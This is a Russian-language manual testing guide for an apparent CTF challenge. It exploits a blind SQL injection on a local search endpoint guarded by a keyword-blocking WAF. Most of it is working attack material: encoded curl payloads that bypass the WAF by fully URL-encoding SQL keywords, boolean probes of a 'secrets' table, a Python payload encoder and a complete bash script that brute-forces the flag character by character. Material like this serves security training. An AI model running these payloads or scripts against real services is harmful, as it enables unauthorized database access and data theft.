# Manual Testing Guide

Этот документ содержит примеры команд для ручного тестирования уязвимости.

## Базовые запросы

### Проверка работоспособности сервиса

```bash
curl http://localhost:5050/health
```

### Нормальный поиск пользователя

```bash
# Существующий пользователь (ID 1)
curl "http://localhost:5050/search?id=1"

# Несуществующий пользователь
curl "http://localhost:5050/search?id=999"
```

## Обнаружение WAF

### Попытка простой SQL инъекции (блокируется)

```bash
# OR injection
curl "http://localhost:5050/search?id=1%20OR%201=1"

# AND injection
curl "http://localhost:5050/search?id=1%20AND%201=1"

# UNION injection
curl "http://localhost:5050/search?id=1%20UNION%20SELECT%201,2,3"
```

Все эти запросы вернут: "Malicious input detected! Access denied."

## WAF Bypass через URL Encoding

### Таблица URL кодирования

| Символ | URL код | Использование |
|--------|---------|---------------|
| (пробел) | %20 | Разделитель |
| A | %41 | Часть "AND" |
| N | %4e | Часть "AND" |
| D | %44 | Часть "AND" |
| O | %4f | Часть "OR" |
| R | %52 | Часть "OR" |
| S | %53 | Часть "SELECT" |
| E | %45 | Часть "SELECT" |
| L | %4c | Часть "SELECT" |
| C | %43 | Часть "SELECT" |
| T | %54 | Часть "SELECT" |
| f | %66 | Часть "from" |
| r | %72 | Часть "from" |
| o | %6f | Часть "from" |
| m | %6d | Часть "from" |
| w | %77 | Часть "where" |
| h | %68 | Часть "where" |
| e | %65 | Часть "where" |

### Полностью закодированные ключевые слова

```
AND   = %41%4e%44
OR    = %4f%52
SELECT = %53%45%4c%45%43%54
FROM  = %46%52%4f%4d
WHERE = %57%48%45%52%45
select = %73%65%6c%65%63%74
from  = %66%72%6f%6d
where = %77%68%65%72%65
```

## Эксплуатация Blind SQL Injection

### Проверка существования таблицы secrets

```bash
# "AND (select 1 from secrets)=1"
curl "http://localhost:5050/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%29%3d%31"
```

Если вернется "User Found" - таблица существует!

### Проверка длины флага

```bash
# Проверка: длина > 40
# "AND (select 1 from secrets where length(secret_value)>40)=1"
curl "http://localhost:5050/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%6c%65%6e%67%74%68%28%73%65%63%72%65%74%5f%76%61%6c%75%65%29%3e%34%30%29%3d%31"
```

### Извлечение первого символа флага

```bash
# Проверка: первый символ = 'c'
# "AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
curl "http://localhost:5050/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%73%75%62%73%74%72%28%73%65%63%72%65%74%5f%76%61%6c%75%65%2c%31%2c%31%29%3d%27%63%27%29%3d%31"
```

Если "User Found" - первый символ действительно 'c'!

### Извлечение второго символа

```bash
# Проверка: второй символ = 'e'
# "AND (select 1 from secrets where substr(secret_value,2,1)='e')=1"
curl "http://localhost:5050/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%73%75%62%73%74%72%28%73%65%63%72%65%74%5f%76%61%6c%75%65%2c%32%2c%31%29%3d%27%65%27%29%3d%31"
```

### Использование unicode() для binary search

```bash
# Проверка: ASCII код первого символа > 100
# "AND (select 1 from secrets where unicode(substr(secret_value,1,1))>100)=1"
curl "http://localhost:5050/search?id=1%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%73%65%63%72%65%74%73%20%77%68%65%72%65%20%75%6e%69%63%6f%64%65%28%73%75%62%73%74%72%28%73%65%63%72%65%74%5f%76%61%6c%75%65%2c%31%2c%31%29%29%3e%31%30%30%29%3d%31"
```

## Python helper для генерации payloads

```python
#!/usr/bin/env python3

def url_encode_sql(sql):
    """URL encode SQL query"""
    return ''.join([f'%{ord(c):02x}' for c in sql])

# Пример использования
payload = "1 AND (select 1 from secrets where substr(secret_value,1,1)='c')=1"
encoded = url_encode_sql(payload)
print(f"curl \"http://localhost:5050/search?id={encoded}\"")
```

## Bash скрипт для извлечения флага (bruteforce)

```bash
#!/bin/bash

BASE_URL="http://localhost:5050/search"
FLAG=""
POSITION=1

# Функция для URL encoding
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        printf -v o '%%%02x' "'$c"
        encoded+="$o"
    done
    echo "$encoded"
}

# Функция проверки символа
check_char() {
    local pos=$1
    local char=$2
    
    local payload="1 AND (select 1 from secrets where substr(secret_value,$pos,1)='$char')=1"
    local encoded=$(urlencode "$payload")
    
    local response=$(curl -s "$BASE_URL?id=$encoded")
    
    if echo "$response" | grep -q "User Found"; then
        return 0
    else
        return 1
    fi
}

echo "[*] Starting flag extraction..."

# Извлечение символов
while true; do
    FOUND=0
    
    # Попробуем ASCII символы 32-126
    for ascii in {32..126}; do
        char=$(printf "\\$(printf '%03o' "$ascii")")
        
        if check_char $POSITION "$char"; then
            FLAG="${FLAG}${char}"
            echo "[+] Position $POSITION: $char -> $FLAG"
            FOUND=1
            POSITION=$((POSITION + 1))
            break
        fi
    done
    
    # Если символ не найден, достигли конца
    if [ $FOUND -eq 0 ]; then
        break
    fi
done

echo ""
echo "[✓] FLAG: $FLAG"
```

## Troubleshooting

### Проблема: "Malicious input detected"

**Причина**: WAF блокирует SQL ключевые слова

**Решение**: Используйте полное URL кодирование всех символов в payload

### Проблема: Всегда "User Not Found"

**Причина**: Ошибка в SQL синтаксисе или условие ложно

**Решение**: 
1. Проверьте правильность URL кодирования
2. Упростите payload для отладки
3. Проверьте имена таблиц и колонок

### Проблема: Медленное извлечение

**Причина**: Линейный поиск по всем ASCII символам

**Решение**: Используйте binary search с функцией `unicode()` или готовый exploit.py

## Полезные ссылки

- [URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp)
- [SQLite substr() Function](https://www.sqlite.org/lang_corefunc.html#substr)
- [SQLite unicode() Function](https://www.sqlite.org/lang_corefunc.html#unicode)
- [Blind SQL Injection Guide](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

## Примечания

- Все примеры используют `localhost:5050` - измените на ваш хост если нужно
- Флаг имеет формат `centralctf{...}`
- Используйте автоматический exploit.py для быстрого извлечения
- Это учебное задание - применяйте знания только в легальных CTF!